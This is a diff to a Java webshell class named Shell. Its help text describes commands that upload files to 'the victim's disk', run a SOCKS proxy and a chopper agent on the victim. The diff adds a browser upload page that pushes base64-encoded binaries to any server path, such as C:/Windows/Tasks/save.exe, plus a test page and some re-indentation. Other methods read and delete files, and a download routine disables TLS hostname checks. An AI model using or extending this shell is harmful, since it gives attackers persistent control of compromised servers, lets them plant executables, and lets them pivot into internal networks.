@@ -36,6 +36,8 @@ import javax.servlet.ServletRequest;
 import javax.servlet.ServletResponse;
 import javax.servlet.http.HttpSession;
 
+
+
 public class Shell {
 
 	public static String execute(String cmd) throws Exception {
@@ -116,6 +118,8 @@ public class Shell {
 				+ "anyurl?pwd=pass&model=upload&path=/tmp/a.elf&content=this_is_content[&type=b]   //upload a text file or a base64 encoded binary file to the victim's disk.\n"
 				+ "anyurl?pwd=pass&model=proxy  //start a socks proxy server on the victim.\n"
 				+ "anyurl?pwd=pass&model=chopper  //start a chopper server agent on the victim.\n\n"
+				+ "anyurl?pwd=pass&model=binupload  //add function GUI file upload.\n\n"
+				+ "anyurl?pwd=pass&model=hello  //add function testpage.\n\n"
 				+ "For learning exchanges only, do not use for illegal purposes.by rebeyond.\n";
 	}
 
@@ -150,31 +154,31 @@ public class Shell {
 		StringBuffer result= new StringBuffer();
 		File f = new File(path);
 		if (f.exists()&&f.isFile()) {
-            FileReader reader = new FileReader(f);
-            BufferedReader br = new BufferedReader(reader);
-            String str = null;
-            while((str = br.readLine()) != null) {
-            	result.append(str+"\n");
-            }
-            br.close();
-            reader.close();
-		} 
+			FileReader reader = new FileReader(f);
+			BufferedReader br = new BufferedReader(reader);
+			String str = null;
+			while((str = br.readLine()) != null) {
+				result.append(str+"\n");
+			}
+			br.close();
+			reader.close();
+		}
 		return result.toString();
 	}
 	private static boolean deleteDir(File dir){
 		boolean result=true;
-		  if(dir.isDirectory()){
-		   File[] files = dir.listFiles();
-		   for(int i=0; i<files.length; i++) {
-		    deleteDir(files[i]);
-		   }
-		  }
-		 if (!dir.delete())
-		 {
-			 result=false;
-		 }
-		 return result;
-		 }
+		if(dir.isDirectory()){
+			File[] files = dir.listFiles();
+			for(int i=0; i<files.length; i++) {
+				deleteDir(files[i]);
+			}
+		}
+		if (!dir.delete())
+		{
+			result=false;
+		}
+		return result;
+	}
 	public static void download(String path) {
 		/*File f = new File(path);
 		if (f.isFile()) {
@@ -199,6 +203,84 @@ public class Shell {
 		}*/
 
 	}
+
+	public static String binupload() throws Exception {
+		return "<!DOCTYPE html>\n" +
+				"<html lang='ja'>\n" +
+				"<head>\n" +
+				"    <meta charset='UTF-8'>\n" +
+				"    <title>File Upload</title>\n" +
+				"</head>\n" +
+				"<body>\n" +
+				"    <input type='file' id='fileInput'>\n" +
+				"    <input type='text' id='textInput' placeholder='C:/Windows/Tasks/save.exe'>\n" +
+				"    <button id='uploadButton'>submit</button>\n" +
+				"\n" +
+				"    <script>\n" +
+				"		 debuging_value = null;\n" +
+				"        document.getElementById('uploadButton').addEventListener('click', () => {\n" +
+				"            const fileInput = document.getElementById('fileInput');\n" +
+				"            const file = fileInput.files[0];\n" +
+				"            const textInput = document.getElementById('textInput').value;\n" +
+				"\n" +
+				"            if (!file) {\n" +
+				"                alert('Selected File Please,');\n" +
+				"                return;\n" +
+				"            }\n" +
+				"\n" +
+				"            if (!textInput) {\n" +
+				"                alert('Input Save Path Please, et. C:/Windows/Temp/save.txt');\n" +
+				"                return;\n" +
+				"            }\n" +
+				"\n" +
+				"            const reader = new FileReader();\n" +
+				"\n" +
+				"            reader.onload = function(event) {\n" +
+				"				 debuging_value = event;\n" +
+				"                const base64String = event.target.result.split(',')[1];\n" +
+				"				 console.log(base64String);\n"+
+				"                sendBase64File(base64String, textInput);\n" +
+				"            };\n" +
+				"\n" +
+				"            reader.readAsDataURL(file);\n" +
+				"        });\n" +
+				"\n" +
+				"        function sendBase64File(base64String, path) {\n" +
+				"            const urlParams = new URLSearchParams(window.location.search);\n" +
+				"            const passTheWorld = urlParams.get('pass_the_world');\n" +
+				"            const model = 'upload';\n" +
+				"            const url = `${window.location.origin}${window.location.pathname}/`;\n" +
+				"\n" +
+				"			 var urlencoded = new URLSearchParams();\n"+
+				"			 urlencoded.append('pass_the_world', passTheWorld);\n"+
+				"			 urlencoded.append('model', model);\n"+
+				"			 urlencoded.append('content', base64String);\n"+
+				"			 urlencoded.append('path', path);\n"+
+				"			 urlencoded.append('type', 'b');\n"+
+				"            fetch(url, {\n" +
+				"                method: 'POST',\n" +
+				"				 headers: {'Content-type':'application/x-www-form-urlencoded'},\n"+
+				"				 body:urlencoded\n"+
+				"            })\n" +
+				"            .then(response => response.text())\n" +
+				"            .then(data => {\n" +
+				"                alert(data);\n" +
+				"            })\n" +
+				"            .catch((error) => {\n" +
+				"                alert(error);\n" +
+				"            });\n" +
+				"        }\n" +
+				"    </script>\n" +
+				"</body>\n" +
+				"</html>";
+	}
+
+
+	public static String hello() {
+		return "<h1>Hello World!!</h1>";
+	}
+
+
 	public static String upload(String path,String fileContent,String type) throws Exception
 	{
 		FileOutputStream fos=new FileOutputStream(path);
@@ -248,26 +330,26 @@ public class Shell {
 		};
 		HttpURLConnection urlCon;
 		URL downloadUrl=new URL(url);
-			HttpsURLConnection.setDefaultHostnameVerifier(ignoreHostnameVerifier);
-			HttpsURLConnection.setDefaultSSLSocketFactory(sslcontext.getSocketFactory());
-			urlCon = (HttpsURLConnection) downloadUrl.openConnection();
-			urlCon.setConnectTimeout(6000);
-			urlCon.setReadTimeout(6000);
-			int code = urlCon.getResponseCode();
-			if (code != HttpURLConnection.HTTP_OK) {
-				throw new Exception("文件读取失败");
-			}
-			// 读文件流
-			DataInputStream in = new DataInputStream(urlCon.getInputStream());
-			DataOutputStream out = new DataOutputStream(new FileOutputStream(path));
-			byte[] buffer = new byte[2048];
-			int count = 0;
-			while ((count = in.read(buffer)) > 0) {
-				out.write(buffer, 0, count);
-				out.flush();
-			}
-			out.close();
-			in.close();
+		HttpsURLConnection.setDefaultHostnameVerifier(ignoreHostnameVerifier);
+		HttpsURLConnection.setDefaultSSLSocketFactory(sslcontext.getSocketFactory());
+		urlCon = (HttpsURLConnection) downloadUrl.openConnection();
+		urlCon.setConnectTimeout(6000);
+		urlCon.setReadTimeout(6000);
+		int code = urlCon.getResponseCode();
+		if (code != HttpURLConnection.HTTP_OK) {
+			throw new Exception("文件读取失败");
+		}
+		// 读文件流
+		DataInputStream in = new DataInputStream(urlCon.getInputStream());
+		DataOutputStream out = new DataOutputStream(new FileOutputStream(path));
+		byte[] buffer = new byte[2048];
+		int count = 0;
+		while ((count = in.read(buffer)) > 0) {
+			out.write(buffer, 0, count);
+			out.flush();
+		}
+		out.close();
+		in.close();
 		return "file " + path + " downloaded successfully,and size is " + new File(path).length() + " Byte.";
 	}
 
